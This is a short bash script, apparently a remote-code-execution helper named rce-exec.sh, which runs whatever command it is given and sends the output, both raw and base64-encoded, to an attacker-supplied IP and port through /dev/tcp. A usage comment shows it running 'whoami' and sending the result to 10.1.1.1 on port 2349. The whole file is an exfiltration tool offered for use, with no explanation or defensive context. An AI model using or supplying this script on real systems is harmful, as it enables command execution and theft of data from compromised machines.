#!/bin/bash
ip=$1;port=$2
shift&&shift
a=`$@`
echo $a > /dev/tcp/$ip/$port
echo $a | base64|sed ':label;N;s/\n//;b label' > /dev/tcp/$ip/$port

## bash /tmp/rce-exec.sh 10.1.1.1 2349 whoami
